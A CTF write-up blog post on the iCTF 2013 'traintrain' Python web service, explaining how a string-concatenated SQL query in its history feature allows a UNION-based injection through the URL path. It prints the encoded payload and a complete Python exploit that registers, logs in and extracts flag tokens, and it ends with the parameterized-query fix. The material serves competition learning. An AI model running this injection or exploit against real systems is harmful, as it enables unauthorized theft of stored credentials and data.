---
title: iCTF 2013 traintrain writeup
author: zTrix
layout: post
permalink: /ictf-2013-traintrain-writeup/
categories:
  - Uncategorized
---
Traintrain is a web system written in python.

There is a register/login page, where we can login using username/password from traintrain.ini. Then a solution page showed up, asks for a solution. Nothing special so far.

Under the service dir, there is a sqlite3 db file detected using file commmand. Open it and execute .dump, we can get the table and data, here is a snippet:

    CREATE TABLE users (username text, password text, authorization text, session text, history text, score int, assignment text, solution text);
    INSERT INTO users VALUES('johndoe','3858f62230ac3c915f300c664312c63f','ab6eff381fffea763a81b73',NULL,NULL,NULL,NULL,NULL);
    INSERT INTO users VALUES('janedoe','96948aad3fcae80c08a35c9b5958cd89','ab56a388299ef6deab12552ccc1',NULL,NULL,NULL,NULL,NULL);
    INSERT INTO users VALUES('aledivlew','fcccdf1344ad3078c2fbec2194996a08','FLGeFrCu4pF4ipCF','0d1444c3861cf373e36b24e6b5a5f785','/',NULL,NULL,NULL);
    

So the flag should be the authorization text of some users.

The source codes are not presented in the service dir. So we decompiled the python bytecode using [uncompyle2][1]. You can find the source code [here][2].

The code is a bit complex. We read through the code thoroughly, even the generate and calculate logic. The basic idea is injection, but We come up with several ideas turned out to be useless, because the code is well protected. After some more review, we noticed that there is a function called history, and the history sql is the only one built by string concatenation rather than sqlite library protected construction. So we decided to do sql injection here.

    query = "select username, score from users where history LIKE '%%%s%%' and not session='%s'" % (history, session)
    

The session variable is well checked and hard to inject, but we can control history variable, since the url path will be joined using &#8216;:&#8217; as separator to form the history string, e.g. &#8220;/:/solution&#8221;.

Then we carefully construct a path:

%\&#8217; or 1=1 union select username, authorization from users where 1=1 or \&#8217;:/solution%\&#8217;=\&#8217;

which will be urlencoded to

%25\&#8217;%20or%201%3D1%20union%20select%20username%2C%20authorization%20from%20users%20where%201%3D1%20or%20\&#8217;%3A%2Fsolution%25\&#8217;%3D\&#8217;

Register a user and login to get a session, hit this urlpath, then it will be stored as the history string. After that, we hit &#8220;/solution&#8221; again to trigger the injected sql, and the flag string will be returned in html. So just parse out the flag and return!

Here is the exploit code:

    class Exploit():
    
      def tt(self, ip, port, flag_id):
        import httplib, time, urllib, random
    
        conn = httplib.HTTPConnection(ip, port)
        uu = random.choice('asfaasdf') + random.choice('asfaasdf') + random.choice('asfaasdf') + random.choice('asfaasdf')
        params = urllib.urlencode({'username': uu, 'password': uu, 'authorization': uu})
        headers = {"Content-type": "application/x-www-form-urlencoded"}
        conn.request("POST", "/register", params, headers)
        response = conn.getresponse()
        header = response.getheaders()
        data = response.read()
        conn.close()
    
        conn = httplib.HTTPConnection(ip, port)
        conn.request('POST', "/login", urllib.urlencode({'username': uu, 'password': uu}), headers)
        response = conn.getresponse()
        header = response.getheaders()
        data = response.read()
        for k, v in header:
            if k.lower() == 'set-cookie':
                cookie = v
        #print cookie
        conn.close()
        #print '--python cookie', cookie
    
        sql = "%25\'%20or%201%3D1%20union%20select%20username%2C%20authorization%20from%20users%20where%201%3D1%20or%20\'%3A%2Fsolution%25\'%3D\'"
        headers['cookie'] = cookie
        conn = httplib.HTTPConnection(ip, port)
        conn.request('POST', "/" + sql, urllib.urlencode({'username': uu, 'password': uu}), headers)
        response = conn.getresponse()
        header = response.getheaders()
        data = response.read()
        conn.close()
        #print '--insert', len(data), data
    
        conn = httplib.HTTPConnection(ip, port)
        conn.request('POST', "/solution", urllib.urlencode({'solution': '1', 'assignment': '2'}), headers)
        response = conn.getresponse()
        header = response.getheaders()
        data = response.read()
        #print '--result', len(data), data
        conn.close()
    
        import re
        mat = re.findall('<tr><td>(.*?)</td>.*?<td>(.*?)</td></tr>', data)
    
        flag = ''
        #print mat
        for item in mat:
            if item[1].startswith('FLG'):
                flag = item[1]
            if item[0] == flag_id and item[1] != 'None':
                return item[1]
        return flag
    
      def execute(self, ip, port, flag_id):
    
        # Put your awesomeness here. You are free to import/use whatever
        # standard Python library you want.
    
        # Your exploit gets as parameters the IP/PORT of the service to
        # attack. The IP is a string, the PORT is an integer.
    
        # For some services, the "flag_id" parameter will be provided:
        # sometimes, this is needed to specify which flag you need to
        # steal (in case there are many on the server). If you feel you
        # don't need to use the "flag_id" parameter, just ignore it.
        # Still, your execute() method will always receive the "flag_id"
        # parameter.
    
        self.flag = self.tt(ip, port, flag_id);
    
      def result(self):
        return {'FLAG' : self.flag }
    

Have known above, we can easily fix the exploit by replace the string concatenation of the sql by sqlite library construction.

Many thanks to Chao Liu who showed expert level hacking skills working with me on this problem.

 [1]: https://github.com/wibiti/uncompyle2
 [2]: https://gist.github.com/zTrix/5230705